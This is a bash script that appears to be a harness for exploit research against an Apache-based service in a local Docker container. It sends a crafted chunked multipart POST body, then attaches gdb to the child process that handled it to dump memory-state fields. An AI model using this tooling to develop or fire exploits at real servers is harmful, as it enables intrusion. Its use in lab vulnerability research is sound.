#!/bin/bash
# usage: run_state.sh <container> <port> <health_path> <a1_path> <outdir>
set -u
C=$1; P=$2; H=$3; A=$4; O=$5
T=$(cat /tmp/opencode/.mw109619_current)
mkdir -p "$O"
docker exec -i "$C" sh -c 'cat > /tmp/dump_state2.gdb' < "$T/work/dump_state2.gdb"
docker restart "$C" >/dev/null; sleep 1.5
for i in $(seq 1 40); do curl -s -o /dev/null "http://127.0.0.1:$P$H" && break; sleep 0.3; done
# one health GET (same as probe)
curl -s -o /dev/null "http://127.0.0.1:$P$H"
sleep 0.2
python3 - "$P" "$A" "$T" <<'PY'
import socket,sys,time
port=int(sys.argv[1]); path=sys.argv[2]; T=sys.argv[3]
body=open('/tmp/opencode/research/9bie_fullchain_multiw_20261022T130520Z/bodies/a1.bin','rb').read()
b=b'C'*10
hdr=("POST %s HTTP/1.1\r\nHost: h\r\nContent-Type: multipart/form-data; boundary=%s\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n"%(path,b.decode())).encode()
req=bytearray(hdr)
for i in range(0,len(body),65536):
    pc=body[i:i+65536]; req+=("%x\r\n"%len(pc)).encode()+pc+b"\r\n"
req+=b"0\r\n\r\n"
s=socket.create_connection(('127.0.0.1',port),timeout=120); s.settimeout(120)
s.sendall(req); out=bytearray()
try:
    while len(out)<100000:
        c=s.recv(65536)
        if not c: break
        out.extend(c)
except OSError: pass
s.close()
print("A1", out.split(b"\r\n",1)[0].decode('latin1','replace'), len(out))
PY
sleep 0.5
tail -3 /var/log/apache2/p2s-access.log 2>/dev/null || true
R=$(docker exec "$C" cat /var/log/apache2/p2s-access.log | grep " POST " | tail -1)
echo "ACCESS_LAST $R"
PID=$(echo "$R" | awk '{print $1}')
echo "A1_CHILD $PID"
{
 echo "== children =="; docker exec "$C" ps -o pid,ppid,user,rss,args -C apache2 2>/dev/null
 echo "== dump child $PID =="
 docker exec "$C" gdb -q -p "$PID" -batch -x /tmp/dump_state2.gdb 2>&1 | grep -E 'STATE|IDLEN|IDMEM|RFCMEM|HSVMEM|DUMP_ERR|ptrace|Error'
 echo "== error log tail =="; docker logs "$C" --since 3m 2>&1 | tail -n 30
} > "$O/state.txt" 2>&1
cat "$O/state.txt"
